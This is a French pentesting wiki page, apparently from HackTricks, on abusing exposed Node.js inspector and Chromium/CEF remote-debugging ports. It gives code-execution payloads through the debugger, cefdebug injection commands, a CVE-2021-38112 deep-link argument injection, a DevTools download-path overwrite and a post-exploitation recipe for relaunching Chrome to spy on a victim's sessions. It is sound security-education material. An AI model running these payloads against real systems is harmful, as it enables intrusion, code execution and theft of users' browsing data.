# Abus du débogueur Node inspector/CEF

Les exemples pratiques historiques incluent le walkthrough Multimaster et l’attaque du debugger de Visual Studio Code liée à la CVE-2019-1414 ; utilisez-les comme contexte spécifique à une version plutôt que de supposer que chaque cible Electron ou Chromium actuelle expose les mêmes primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Informations de base

[Selon la documentation](https://nodejs.org/learn/getting-started/debugging) : lorsqu’il est démarré avec l’option `--inspect`, un processus Node.js écoute un client de debugging. **Par défaut**, il écoute sur l’hôte et le port **`127.0.0.1:9229`**. Un **UUID** **unique** est également attribué à chaque processus.<sup>[[4]](#references)</sup>

Les clients de l’Inspector doivent connaître et spécifier l’adresse de l’hôte, le port et l’UUID pour se connecter. Une URL complète ressemble à ceci : `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Comme le **debugger dispose d’un accès complet à l’environnement d’exécution Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d’exécuter du code arbitraire au nom du processus Node.js (**élévation potentielle de privilèges**).<sup>[[4]](#references)</sup>

Il existe plusieurs façons de démarrer un Inspector :<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Les processus basés sur **CEF** (**Chromium Embedded Framework**) peuvent exposer un debugger avec `--remote-debugging-port=9222`. Cela expose le navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) plutôt que via un inspecteur Node.js. Les payloads basés sur `process` de Node.js ne sont donc pas directement applicables par défaut.<sup>[[2]](#references)[[5]](#references)</sup>

Lorsque vous démarrez un navigateur débogué, quelque chose comme ceci apparaît :<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Navigateurs, WebSockets et same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites Web ouverts dans un navigateur Web peuvent effectuer des requêtes WebSocket et HTTP selon le modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session unique du debugger**. La **same-origin-policy** **empêche** les sites Web d’établir **cette connexion HTTP**. Pour renforcer la sécurité contre les [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion spécifient soit une **adresse IP**, soit **`localhost`** précisément.<sup>[[4]](#references)</sup>

> [!TIP]
> Cette **mesure de sécurité empêche d’exploiter l’inspector** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait être fait en exploitant une vuln SSRF).<sup>[[4]](#references)</sup>

### Démarrer l’inspector dans des processus en cours d’exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d’exécution pour le faire **démarrer l’inspector** sur le port par défaut. Cependant, notez que vous devez disposer de privilèges suffisants. Cela peut donc vous donner un **accès privilégié aux informations présentes dans le processus**, mais ne constitue pas une élévation directe de privilèges.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Cela est utile dans les conteneurs, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n'est pas une option**, puisque le **conteneur** sera **arrêté** avec le processus.<sup>[[6]](#references)</sup>

### Se connecter à l'inspector/debugger

Pour se connecter à un navigateur **basé sur Chromium**, les URL `chrome://inspect` ou `edge://inspect` peuvent être utilisées respectivement pour Chrome ou Edge. En cliquant sur le bouton Configure, il faut s'assurer que l'**hôte et le port cibles** sont correctement répertoriés. L'image montre un exemple de Remote Code Execution (RCE) :<sup>[[2]](#references)[[4]](#references)</sup>

![Après une URL permettant d'accéder au debugger, celle-ci apparaîtra. Par exemple : ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l'inspector/debugger : Pour se connecter à un navigateur basé sur Chromium, ...](<../../images/image (674).png>)

En utilisant la **ligne de commande**, vous pouvez vous connecter à un debugger/inspector avec :<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
L’outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspectors** exécutés localement et d’y **injecter du code**.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Notez que les exploits **RCE** de **NodeJS** ne fonctionneront pas si vous êtes connecté à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez vérifier l'API pour trouver des choses intéressantes à faire avec celui-ci).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE dans le Debugger/Inspector de NodeJS

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE à partir d'une XSS dans Electron, consultez cette page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Voici quelques méthodes courantes pour obtenir une **RCE** lorsque vous pouvez **vous connecter** à un **inspector** Node, en utilisant quelque chose comme (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools protocol**) :<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Charges utiles du Chrome DevTools Protocol

Vous pouvez consulter l’API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Dans cette section, je vais simplement lister les éléments intéressants que j’ai trouvés et que des personnes ont utilisés pour exploiter ce protocole.

### Injection de paramètres via des Deep Links

Dans le [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu’une application basée sur CEF avait **enregistré un URI** personnalisé dans le système (workspaces://index.html), qui recevait l’URI complète, puis **lançait l’application basée sur CEF** avec une configuration partiellement construite à partir de cette URI.<sup>[[8]](#references)</sup>

Il a été découvert que les paramètres de l’URI étaient décodés au format URL et utilisés pour lancer l’application basée sur CEF, permettant à un utilisateur d’**injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d’exécuter des actions arbitraires.<sup>[[8]](#references)</sup>

Ainsi, une payload comme celle-ci :
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Exécutera un calc.exe.<sup>[[8]](#references)</sup>

### Écraser des fichiers

Modifiez le dossier où les **fichiers téléchargés vont être enregistrés** et téléchargez un fichier pour **écraser** le **code source** fréquemment utilisé par l’application avec votre **code malveillant**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE et exfiltration

STAR Labs a montré que des services WebDriver/CDP exposés peuvent permettre la lecture arbitraire de fichiers et l'exécution de code à distance (RCE) ; le DNS rebinding peut compléter la chaîne d'exploit dans certaines configurations.<sup>[[9]](#references)</sup>

Pour plus d'informations sur les cas historiques liés à l'automatisation des navigateurs et à la sécurité de Chromium, consultez le write-up de Counter WebDriver ainsi que les issues 773, 1742 et 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Dans un environnement réel et **après avoir compromis** un PC utilisateur utilisant un navigateur basé sur Chrome/Chromium, vous pourriez lancer un processus Chrome avec le **debugging activé et effectuer un port-forward du port de debugging** afin d'y accéder. De cette manière, vous pourrez **inspecter tout ce que fait la victime avec Chrome et voler des informations sensibles**.<sup>[[7]](#references)</sup>

La méthode furtive consiste à **terminer tous les processus Chrome**, puis à appeler quelque chose comme :<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Outil d'inspection et d'exploitation du debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414 : Remote Code Execution de Visual Studio Code via le debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guide de debugging Node.js - Premiers pas](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation : Abuser de la fonctionnalité de debugging de Chrome pour observer et contrôler des sessions de navigation à distance](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112 : Remote Code Execution d'AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Tu me parles ? - WebDriver RCE via DNS Rebinding et CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contre WebDriver - De Bot à RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Issue 773 de Google Project Zero (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Issue 1742 de Google Project Zero (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Issue 1944 de Google Project Zero (bug tracker Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
